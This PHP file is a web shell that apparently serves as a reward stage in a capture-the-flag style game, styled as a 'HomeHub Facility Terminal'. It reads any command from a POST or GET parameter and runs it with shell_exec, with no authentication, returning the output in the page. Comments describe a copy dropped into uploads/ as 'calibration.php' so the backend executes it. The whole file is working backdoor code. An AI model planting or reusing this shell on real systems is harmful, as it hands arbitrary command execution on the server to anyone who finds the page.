<?php
// HomeHub Facility Terminal — deployed by successful device calibration.
// The master copy of this file lives OUTSIDE uploads/ on purpose; only the
// copy calibration.php in uploads/ gets executed by the PHP backend.
error_reporting(E_ERROR | E_PARSE);

$cmd = $_POST['cmd'] ?? $_GET['c'] ?? null;
$output = null;
if ($cmd !== null && trim($cmd) !== '') {
    // 2>&1 merges stderr so players see errors too
    $output = shell_exec($cmd . ' 2>&1');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>HomeHub — Facility Terminal</title>
</head>
<body style="background:#141414;color:#33ff33;font-family:monospace;">
    <h2>🖥️ HomeHub Facility Terminal</h2>
    <p><em>Authorized resonance detected. I am the one who knocks.</em></p>
    <form method="POST">
        <input type="text" name="cmd" autofocus style="width:70%"
               placeholder="command"
               value="<?= htmlspecialchars($cmd ?? '') ?>">
        <button type="submit">Run</button>
    </form>
    <?php if ($output !== null): ?>
    <pre style="border:1px solid #33ff33;padding:10px;"><?= htmlspecialchars($output !== '' ? $output : '(no output)') ?></pre>
    <?php endif; ?>
    <p><small>Session commands run as the PHP backend user. Tread lightly.</small></p>
</body>
</html>
